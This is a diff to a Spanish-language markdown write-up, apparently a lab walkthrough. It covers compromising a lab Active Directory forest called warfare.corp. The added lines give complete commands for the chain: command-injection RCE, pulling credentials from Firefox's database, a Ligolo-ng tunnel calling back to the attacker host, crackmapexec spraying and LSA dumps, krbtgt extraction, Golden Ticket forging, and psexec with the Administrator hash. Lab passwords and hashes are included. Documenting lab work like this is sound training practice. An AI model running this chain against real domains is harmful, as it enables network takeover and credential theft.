@@ -33,6 +33,7 @@ Visualización de la arquitectura de red con dos segmentos (externo e interno), 
 
 ![](/assets/images/activedirectory/dc_2.png)
 
+
 ## Descubrimiento:
 
 Se utiliza nmap para escanear el rango de la red externa (192.168.80.0/24) y descubrir hosts activos.
@@ -63,6 +64,7 @@ Se utiliza Burp Suite para interceptar la solicitud POST del formulario y revisa
 
 ![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01604.png)
 
+
 ## Explotación:
 
 Al inyectar el comando cat /etc/passwd, el servidor ejecuta el RCE y devuelve el contenido del archivo, revelando el usuario privilege para el acceso inicial.
@@ -79,21 +81,38 @@ Dentro del servidor se obseran dos interfaces de red, confirmando acceso a una r
 
 Se comprueba la existencia del directorio .mozilla/firefox en la máquina comprometida para buscar bases de datos de historial y marcadores que puedan contener credenciales.
 
+• ls -la .mozilla/
+• cd .mozilla/firefox/
+• cd b2rri1qd.default-release
+
 ![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01604.png)
 
 Usaremos sqlite3 para acceder a la base de datos de Firefox.
+
+• sqlite3 places.sqlite
+• .tables
 
 ![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01604.png)
 
 Encontramos algunas credenciales interesantes en la base de datos de marcadores de Mozilla.
 
+• select * from moz_bookmarks;
+
 ![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01604.png)
+
 
 ## Pivote
 
-Tenemos que realizar el pivote ya que 192.168.98.0/24 no es accesible directamente de la red VPN. Utilizaremos ligalo-ng para lo mismo.
+Tenemos que realizar el pivote ya que 192.168.98.0/24 no es accesible directamente desde el equipo atacante. Utilizaremos ligalo-ng.
+
+• sudo ip tuntap add user kali mode tun ligolo
+• sudo ip route del 192.168.98.0/24 dev tun0
+• sudo ip link set ligolo up
+• sudo ip route add 192.168.98.0/24 dev ligolo
 
 ![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01604.png)
+
+• ./agent -connect 10.10.200.66:443 -ignore-cert
 
 Se transfiere y se ejecuta el agente de Ligolo-ng en el servidor, estableciendo la conexión y el túnel hacia la máquina atacante
 
@@ -101,21 +120,104 @@ Se transfiere y se ejecuta el agente de Ligolo-ng en el servidor, estableciendo 
 
 Se ejecuta el proxy de Ligolo-ng en la máquina atacante y se confirma que el agente se ha conectado exitosamente, listando la nueva sesión de túnel a través de 192.168.80.10.
 
+• ./proxy -selfcert -laddr 0.0.0.0:443
+
 ![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01604.png)
 
 Se confirma que el túnel de Ligolo-ng está operativo al poder hacer ping a la red 192.168.98.0/24.
 
 ![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01604.png)
 
+Se ejecuta un nuevo escaneo nmap a través del túnel (192.168.98.0/24), descubriendo múltiples hosts, incluyendo el Controlador de Dominio Padre (192.168.98.2).
+
+![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01604.png)
+
+Cree un archivo txt con hosts en vivo en la red 192.168.98.0/24.
+
+![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01604.png)
+
+Se utiliza crackmapexec para probar credenciales obtenidas de la BD de Mozilla (john:User1@#$%6) contra los hosts internos, obteniendo acceso de administrador local al servidor MGMT (192.168.98.30).
+
+•	crackmapexec --verbose smb target.txt -u john -p User1@#$%6
+
+![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01604.png)
+
+Se utiliza crackmapexec para realizar un volcado de secretos LSA en el servidor MGMT (192.168.98.30), obteniendo la credencial en texto plano del usuario corpmngr:User4&*&**.
+
+•	crackmapexec --verbose smb 192.168.98.30 -u john -p User1@#$%6 –lsa
+
+![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01604.png)
+
+Se reutiliza la credencial recién descubierta y se logra la autenticación de administrador local en el Child Domain Controller (CDC) 192.168.98.120.
+
+•	crackmapexec --verbose smb target.txt -u corpmngr -p 'User4&*&*'
+
+![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01604.png)
+
+Se actualiza el archivo /etc/hosts en la máquina atacante para mapear las IPs de los Controladores de Dominio con sus nombres DNS correspondientes (warfare.corp y child.warfare.corp).
+
+![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01604.png)
 
 
+## Extracción del Hash
+
+Se utiliza impacket-secretsdump en el Child DC para extraer los hashes de la cuenta de servicio krbtgt, el componente clave para el ataque Golden Ticket.
+
+•	/usr/bin/impacket-secretsdump -debug child/corpmngr:'User4&*&*'@cdc.child.warfare.corp -just-dc-user 'child\krbtgt'
+
+![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01604.png)
 
 
+## Extracción del Hash
+
+Se utiliza impacket-lookupsid para obtener el Identificador de Seguridad (SID) único del Dominio Hijo y Padre, dato crucial para la posterior falsificación del Golden Ticket.
+
+•	/usr/bin/impacket-lookupsid child/corpmngr:'User4&*&*'@child.warfare.corp
+•	/usr/bin/impacket-lookupsid child/corpmngr:'User4&*&*'@warfare.corp
+
+![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01604.png)
+
+![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01604.png)
 
 
+## Forjado del Golden Ticket
 
-## Referencias:
+Se utiliza impacket-ticketer junto con el hash krbtgt y los SIDs de ambos dominios para forjar un Golden Ticket y guardarlo en el archivo corpmngr.ccache.
 
-• https://heartbleed.com/
+•	/usr/bin/impacket-ticketer -domain child.warfare.corp -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 -domain-sid S-1-5-21-3754860944-83624914-1883974761 -groups 516 -user-id 1106 -extra-sid S-1-5-21-3375883379-808943238-3239386119-516,S-1-5-9 'corpmngr'
 
-• https://www.welivesecurity.com/la-es/2014/04/09/5-cosas-debes-saber-sobre-heartbleed/
+![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01604.png)
+
+Se exporta el archivo corpmngr.ccache a la variable de entorno KRB5CCNAME, cargando el Golden Ticket para su uso en la autenticación Kerberos.
+
+•	export KRB5CCNAME=corpmngr.ccache
+
+![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01604.png)
+
+
+## Solicitud de Ticket de Servicio (Golden Ticket en Acción)
+
+Se utiliza impacket-getST con el Golden Ticket cargado para solicitar un Ticket de Servicio (ST) para el servicio CIFS en el Controlador de Dominio Padre, obteniendo acceso al dominio superior.
+
+•	sudo /usr/bin/impacket-getST -spn 'CIFS/dc01.warfare.corp' -k -no-pass child.warfare.corp/corpmngr -debug
+
+![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01604.png)
+
+Se exporta el Ticket de Servicio (ST) recién adquirido a la variable de entorno KRB5CCNAME, permitiendo que las herramientas de impacket se autentiquen contra el Dominio Padre.
+
+•	export KRB5CCNAME=corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
+
+![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01604.png)
+
+Utilizando el Ticket de Servicio cargado, se ejecuta impacket-secretsdump contra el Controlador de Dominio Padre (dc01.warfare.corp) para extraer los hashes del usuario Administrador del Dominio.
+
+•	/usr/bin/impacket-secretsdump -k -no-pass dc01.warfare.corp -just-dc-user 'warfare\Administrator' -debug
+
+![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01604.png)
+
+Se utiliza impacket-psexec con los hashes del Administrador para obtener una sesión de shell en el Controlador de Dominio Padre (dc01).
+
+•	/usr/bin/impacket-psexec -debug 'warfare/Administrator@dc01.warfare.corp' -hashes aad3b435b51404eeaad3b435b51404ee:a2f7b77b62cd97161e18be2ffcfdfd60
+
+![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01604.png)
+
